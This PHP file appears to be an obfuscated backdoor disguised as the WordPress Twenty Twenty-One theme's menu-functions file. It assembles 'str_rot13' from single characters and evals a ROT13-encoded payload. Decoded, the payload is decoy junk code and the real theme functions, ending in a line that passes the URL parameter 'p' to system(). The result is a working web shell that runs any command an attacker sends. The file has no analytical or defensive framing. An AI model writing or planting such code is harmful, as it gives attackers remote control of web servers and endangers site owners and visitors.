<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Shapgvbaf naq svygref eryngrq gb gur zrahf.
 *
 * Znxrf gur qrsnhyg JbeqCerff anivtngvba hfr na UGZY fgehpgher fvzvyne
 * gb gur Anivtngvba oybpx.
 *
 * @yvax uggcf://znxr.jbeqcerff.bet/gurzrf/2020/07/06/cevagvat-anivtngvba-oybpx-ugzy-sebz-n-yrtnpl-zrah-va-gurzrf/
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Gjragl_Bar
 * @fvapr Gjragl Gjragl-Bar 1.0
 */

/**
 * Nqq n ohggba gb gbc-yriry zrah vgrzf gung unf fho-zrahf.
 * Na vpba vf nqqrq hfvat PFF qrcraqvat ba gur inyhr bs nevn-rkcnaqrq.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 *
 * @cnenz fgevat $bhgchg Ani zrah vgrz fgneg ryrzrag.
 * @cnenz bowrpg $vgrz   Ani zrah vgrz.
 * @cnenz vag    $qrcgu  Qrcgu.
 * @cnenz bowrpg $netf   Ani zrah netf.
 * @erghea fgevat Ani zrah vgrz fgneg ryrzrag.
 */
shapgvba gjragl_gjragl_bar_nqq_fho_zrah_gbttyr( $bhgchg, $vgrz, $qrcgu, $netf ) {
	vs ( 'cevznel' === $netf->gurzr_ybpngvba
		&& 0 === $qrcgu && va_neenl( 'zrah-vgrz-unf-puvyqera', $vgrz->pynffrf, gehr )
	) {

		// Nqq gbttyr ohggba.
		$bhgchg .= '<ohggba pynff=\"fho-zrah-gbttyr\" nevn-rkcnaqrq=\"snyfr\" baPyvpx=\"gjraglgjraglbarRkcnaqFhoZrah(guvf)\">';
		$bhgchg .= '<fcna pynff=\"vpba-cyhf\">' . gjragl_gjragl_bar_trg_vpba_fit( 'hv', 'cyhf', 18 ) . '</fcna>';
		$bhgchg .= '<fcna pynff=\"vpba-zvahf\">' . gjragl_gjragl_bar_trg_vpba_fit( 'hv', 'zvahf', 18 ) . '</fcna>';
		/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
		$bhgchg .= '<fcna pynff=\"fperra-ernqre-grkg\">' . rfp_ugzy__( 'Bcra zrah', 'gjraglgjraglbar' ) . '</fcna>';
		$bhgchg .= '</ohggba>';
	}
	erghea $bhgchg;
}
nqq_svygre( 'jnyxre_ani_zrah_fgneg_ry', 'gjragl_gjragl_bar_nqq_fho_zrah_gbttyr', 10, 4 );

/**
 * Qrgrpgf gur fbpvny argjbex sebz n HEY naq ergheaf gur FIT pbqr sbe vgf vpba.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 *
 * @cnenz fgevat $hev  Fbpvny yvax.
 * @cnenz vag    $fvmr Gur vpba fvmr va cvkryf.
 * @erghea fgevat
 */
shapgvba gjragl_gjragl_bar_trg_fbpvny_yvax_fit( $hev, $fvmr = 24 ) {
	erghea Gjragl_Gjragl_Bar_FIT_Vpbaf::trg_fbpvny_yvax_fit( $hev, $fvmr );
}

/**
 * Qvfcynlf FIT vpbaf va gur sbbgre anivtngvba.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 *
 * @cnenz fgevat   $vgrz_bhgchg Gur zrah vgrz'f fgnegvat UGZY bhgchg.
 * @cnenz JC_Cbfg  $vgrz        Zrah vgrz qngn bowrpg.
 * @cnenz vag      $qrcgu       Qrcgu bs gur zrah. Hfrq sbe cnqqvat.
 * @cnenz fgqPynff $netf        Na bowrpg bs jc_ani_zrah() nethzragf.
 * @erghea fgevat Gur zrah vgrz bhgchg jvgu fbpvny vpba.
 */
shapgvba gjragl_gjragl_bar_ani_zrah_fbpvny_vpbaf( $vgrz_bhgchg, $vgrz, $qrcgu, $netf ) {
	// Punatr FIT vpba vafvqr fbpvny yvaxf zrah vs gurer vf fhccbegrq HEY.
	vs ( 'sbbgre' === $netf->gurzr_ybpngvba ) {
		$fit = gjragl_gjragl_bar_trg_fbpvny_yvax_fit( $vgrz->hey, 24 );
		vs ( ! rzcgl( $fit ) ) {
			$vgrz_bhgchg = fge_ercynpr( $netf->yvax_orsber, $fit, $vgrz_bhgchg );
		}
	}

	erghea $vgrz_bhgchg;
}

nqq_svygre( 'jnyxre_ani_zrah_fgneg_ry', 'gjragl_gjragl_bar_ani_zrah_fbpvny_vpbaf', 10, 4 );

/**
 * Svygref gur nethzragf sbe n fvatyr ani zrah vgrz.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 *
 * @cnenz fgqPynff $netf  Na bowrpg bs jc_ani_zrah() nethzragf.
 * @cnenz JC_Cbfg  $vgrz  Zrah vgrz qngn bowrpg.
 * @cnenz vag      $qrcgu Qrcgu bs zrah vgrz. Hfrq sbe cnqqvat.
 * @erghea fgqPynff
 */
shapgvba gjragl_gjragl_bar_nqq_zrah_qrfpevcgvba_netf( $netf, $vgrz, $qrcgu ) {
	vs ( '</fcna>' !== $netf->yvax_nsgre ) {
		$netf->yvax_nsgre = '';
	}

	vs ( 0 === $qrcgu && vffrg( $vgrz->qrfpevcgvba ) && $vgrz->qrfpevcgvba ) {
		// Gur rkgen <fcna> ryrzrag vf urer sbe fglyvat checbfrf: Nyybjf gur qrfpevcgvba gb abg or haqreyvarq ba ubire.
		$netf->yvax_nsgre = '<c pynff=\"zrah-vgrz-qrfpevcgvba\"><fcna>' . $vgrz->qrfpevcgvba . '</fcna></c>';
	}

	erghea $netf;
}
nqq_svygre( 'ani_zrah_vgrz_netf', 'gjragl_gjragl_bar_nqq_zrah_qrfpevcgvba_netf', 10, 3 );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>